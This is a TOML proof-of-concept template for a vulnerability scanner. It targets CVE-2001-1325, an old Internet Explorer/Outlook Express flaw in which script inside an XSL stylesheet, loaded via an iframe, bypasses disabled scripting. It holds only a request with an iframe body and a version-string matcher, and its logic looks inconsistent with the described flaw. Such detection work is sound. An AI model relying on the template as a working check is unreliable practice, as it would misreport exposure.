[info]
author = "ave"
description = "通过 XML 样式表（XSL）中嵌入脚本并利用 IFRAME 引用，绕过 IE 已禁用的 Active Scripting 设置执行任意脚本代码"
id = "POC-AVE-2001-0524"
name = "Microsoft Internet Explorer/Outlook Express XML 样式表脚本执行漏洞 PoC"
severity = "high"
tags = [
    "cve-2001-1325",
    "ie",
    "xsl",
    "script-bypass",
]
vuln_id = [
    "CVE-2001-1325",
    "AVE-2001-0524",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc-ave-2001-0524.html"
protocol = "http"

[poc.requests.body]
content = '<html><body><iframe src="poc-ave-2001-0524.xml"></iframe></body></html>'
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "MSIE 5.0",
    "MSIE 5.5",
]
